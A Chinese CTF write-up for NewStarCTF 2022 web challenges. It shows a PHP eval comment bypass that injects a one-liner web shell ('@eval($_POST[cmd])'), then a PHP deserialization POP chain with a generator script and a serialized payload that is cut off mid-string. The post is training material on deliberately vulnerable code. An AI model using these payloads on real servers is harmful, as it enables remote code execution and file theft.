{"title":"NewStarCTF2022公开赛-wp","uid":"8d801008e226a8eb98ad443ed169bddb","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","updated":"2023-08-06T08:01:55.254Z","comments":true,"path":"api/articles/2022NewStarCTF.json","keywords":null,"cover":"/img/40.jpg","content":"<p><code>没啥简介</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"NewStarCTF2022公开赛\"><a href=\"#NewStarCTF2022公开赛\" class=\"headerlink\" title=\"NewStarCTF2022公开赛\"></a>NewStarCTF2022公开赛</h1><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>\n<h2 id=\"1-NotPHP\"><a href=\"#1-NotPHP\" class=\"headerlink\" title=\"1.NotPHP\"></a>1.NotPHP</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;data&#x27;</span>]) == <span class=\"hljs-string\">&quot;Welcome to CTF&quot;</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;key1&#x27;</span>]) === <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;key1&#x27;</span>] !== <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;key2&#x27;</span>])&#123;<br>        <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]) == <span class=\"hljs-number\">2077</span>)&#123;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Hack Me&quot;</span>;<br>            <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&quot;#&quot;</span>.<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>]);<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Number error!&quot;</span>);<br>        &#125;<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Wrong Key!&quot;</span>);<br>    &#125;<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Pass it!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>\n\n<p>这里绕过不细讲，都是常见的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&quot;#&quot;</span>.<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure>\n\n<p>细讲这个</p>\n<p>这个是一个<code>eval</code>函数，但是里面其实已经被<code>#</code>给注释掉了，</p>\n<p>所以无论输入什么都没结果</p>\n<hr>\n<p>因此需要闭合或者绕过<code>#</code></p>\n<p>但是我试了很多闭合方式，结果都没反应</p>\n<p>最后发现</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\"><span class=\"hljs-string\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>实现了语句闭合，</p>\n<p>但是，当把这个php结尾符加到后面时候，这个php就就结束了</p>\n<p>以</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&quot;#&quot;</span>.<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure>\n\n<p>为例子</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">url/xxx&amp;cmd=?&gt;haha<br></code></pre></td></tr></table></figure>\n\n<p>当我们闭合了php代码后，那后面的<code>haha</code>的位置在哪里呢</p>\n<p><img src=\"/post/2022NewStarCTF/image-20220921083750913.png\" alt=\"image-20220921083750913\"></p>\n<p>我们可以看到，<code>haha</code>变成了<code>html</code>代码</p>\n<p>那么就可以操作了，</p>\n<p>比如xss，一句话🐎的插入等</p>\n<p>xss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）</p>\n<hr>\n<p>插入一句话🐎</p>\n<p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jsp\">&lt;script language=<span class=\"hljs-string\">&quot;php&quot;</span>&gt;<span class=\"hljs-meta\">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>但是用蚁剑连不上</p>\n<p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&quot;cmd&quot;</span>]);<span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>好家伙，传统思路，才是真</p>\n<p>连接成功拿到<code>flag</code></p>\n<hr>\n<p>不知道有没有看到这篇文章的同学看到这个<code>wp</code>，提醒一下，这里需要在<code>http body</code>里补充<code>num</code>请求信息</p>\n<p>因为这也是绕过的一个环节</p>\n<p><img src=\"/post/2022NewStarCTF/image-20220921084836402.png\" alt=\"image-20220921084836402\"></p>\n<hr>\n<h2 id=\"2-UnserializeOne\"><a href=\"#2-UnserializeOne\" class=\"headerlink\" title=\"2.UnserializeOne\"></a>2.UnserializeOne</h2><p>一道<code>popchain</code>，这还是我第一次做<code>popchain</code>类【惭愧，不过做着真有意思】</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Start</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$name</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$func</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"hljs-variable language_\">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__isset</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$var</span></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        (<span class=\"hljs-variable language_\">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Sec</span></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$obj</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$var</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__toString</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;obj-&gt;<span class=\"hljs-title function_ invoke__\">check</span>(<span class=\"hljs-variable\">$this</span>-&gt;<span class=\"hljs-keyword\">var</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__invoke</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-string\">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Easy</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$cla</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__call</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$fun</span>, <span class=\"hljs-variable\">$var</span></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;cla = <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-variable\">$var</span>[<span class=\"hljs-number\">0</span>];<br>    &#125;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">eeee</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$obj</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__clone</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pop&#x27;</span>]))&#123;<br>    <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>构造<code>pop</code>链主要在于，</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">把我们需要触发的魔术方法联系在一起，而且在联系触发过程中也要记得实例化目标类，这样才能调用和执行其中的方法<br></code></pre></td></tr></table></figure>\n\n\n\n<p>我们先中每个类其中的魔术方法列出来看看，再分析一下</p>\n<p><code>Start</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Start</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$name</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$func</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">     //<span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>)，对象被销毁时触发，也就是最后运行结束时触发</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"hljs-variable language_\">$this</span>-&gt;name;<br>      <span class=\"hljs-comment\">//这里进行echo $this-&gt;name，如果$this-&gt;name是一个类就会调用Sec()类里__toString()</span><br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__isset</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$var</span></span>)</span><br><span class=\"hljs-function\">   //<span class=\"hljs-title\">__isset</span>(<span class=\"hljs-params\"></span>)，当对不可访问属性调用<span class=\"hljs-title\">isset</span>(<span class=\"hljs-params\"></span>)或<span class=\"hljs-title\">empty</span>(<span class=\"hljs-params\"></span>)时调用</span><br><span class=\"hljs-function\">    </span>&#123;<br>        (<span class=\"hljs-variable language_\">$this</span>-&gt;func)();<br>        <span class=\"hljs-comment\">//这里把$this-&gt;func当作一个函数，执行$this-&gt;func()</span><br>        <span class=\"hljs-comment\">//如果$this-&gt;func不是一个正确的函数名，就会调用Sec类里__invoke()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>Sec</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Sec</span></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$obj</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$var</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__toString</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">  //<span class=\"hljs-title\">__toString</span>(<span class=\"hljs-params\"></span>)，把类当做字符串时触发，</span><br><span class=\"hljs-function\">  //所以在<span class=\"hljs-title\">Start</span>类中的[<span class=\"hljs-title\">echo</span> &quot;<span class=\"hljs-title\">Welcome</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">NewStarCTF</span>, &quot;.$<span class=\"hljs-title\">this</span>-&gt;<span class=\"hljs-title\">name</span></span>;]，就需要把name值赋值为Sec类名<br>    &#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;obj-&gt;<span class=\"hljs-title function_ invoke__\">check</span>(<span class=\"hljs-variable\">$this</span>-&gt;<span class=\"hljs-keyword\">var</span>);<br>       <span class=\"hljs-comment\">//这里想调用this-&gt;obj的check方法</span><br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__invoke</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">     //<span class=\"hljs-title\">__invoke</span>(<span class=\"hljs-params\"></span>)，当脚本尝试将对象调用为函数时触发</span><br><span class=\"hljs-function\">   //所以在<span class=\"hljs-title\">Start</span>类中的[$<span class=\"hljs-title\">this</span>-&gt;<span class=\"hljs-title\">func</span>)(<span class=\"hljs-params\"></span>)</span>;]中，需要把func值赋值为Sec，从而把其当作函数执行时，从而触其魔术方法<br>    &#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-string\">&#x27;/flag&#x27;</span>);<br>      <span class=\"hljs-comment\">//这里就是目标，执行文件包含flag输出内容</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>Easy</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Easy</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$cla</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__call</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$fun</span>, <span class=\"hljs-variable\">$var</span></span>)</span><br><span class=\"hljs-function\">   //<span class=\"hljs-title\">__call</span>(<span class=\"hljs-params\"></span>)，在对象上下文中调用不可访问的方法时触发</span><br><span class=\"hljs-function\">   //所以在<span class=\"hljs-title\">Sec</span>类中，当<span class=\"hljs-title\">this</span>-&gt;<span class=\"hljs-title\">obj</span>赋值为<span class=\"hljs-title\">Easy</span>类时，调用<span class=\"hljs-title\">check</span>方法时，就会触发，因为<span class=\"hljs-title\">Easy</span>里没有<span class=\"hljs-title\">check</span>函数</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;cla = <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-variable\">$var</span>[<span class=\"hljs-number\">0</span>];<br>        <span class=\"hljs-comment\">//这里调用clone，当对象完成复制时会执行eeee里的__clone</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>eeee</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">eeee</span></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$obj</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__clone</span>(<span class=\"hljs-params\"></span>)</span><br><span class=\"hljs-function\">    </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class=\"hljs-comment\">//这里是对$this-&gt;obj的cmd属性使用isset函数，但是并不存在cmd属性</span><br>            <span class=\"hljs-comment\">//所以把this-&gt;obj赋值为Strat类名，从而触发__isset</span><br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>整理一下</p>\n<figure class=\"highlight zephir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zephir\">Start::__destruct<br><br>==&gt;<br><br>Sec::__toString<br><br>==&gt;<br><br>Easy::__call<br><br>==&gt;<br><br>eeee::__clone<br><br>==&gt;<br><br>Start::__isset<br><br>==&gt;<br><br>Sec::__invoke<br></code></pre></td></tr></table></figure>\n\n<p>于是<code>payload</code>为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Start</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$name</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$func</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Sec</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$obj</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$var</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Easy</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$cla</span>;<br>&#125;<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">eeee</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$obj</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$start</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Start</span>();<br><span class=\"hljs-variable\">$sec</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Sec</span>();<br><span class=\"hljs-variable\">$easy</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Easy</span>();<br><span class=\"hljs-variable\">$eeee</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title function_ invoke__\">eeee</span>();<br><br><span class=\"hljs-variable\">$start</span>-&gt;name=<span class=\"hljs-variable\">$sec</span>;<br><span class=\"hljs-variable\">$start</span>-&gt;func=<span class=\"hljs-variable\">$sec</span>;<br><br><span class=\"hljs-variable\">$sec</span>-&gt;obj=<span class=\"hljs-variable\">$easy</span>;<br><span class=\"hljs-variable\">$sec</span>-&gt;<span class=\"hljs-keyword\">var</span>=<span class=\"hljs-variable\">$eeee</span>;<br><br><span class=\"hljs-variable\">$eeee</span>-&gt;obj=<span class=\"hljs-variable\">$start</span>;<br><span class=\"hljs-comment\">//因为这里把eeee里的变量复制为实例化的Start的类，所以如果从eeee类为开始序列化的入口也是可以的</span><br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$start</span>);<br><span class=\"hljs-comment\">//echo serialize($eeee);</span><br></code></pre></td></tr></table></figure>\n\n<p>得到序列化数据，<code>post</code>传入就行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">O:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">&quot;Start&quot;</span>:<span class=\"hljs-number\">2</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;name&quot;</span>;O:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;Sec&quot;</span>:<span class=\"hljs-number\">2</span>:&#123;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;obj&quot;</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;Easy&quot;</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;cla&quot;</span>;N;&#125;s:<span 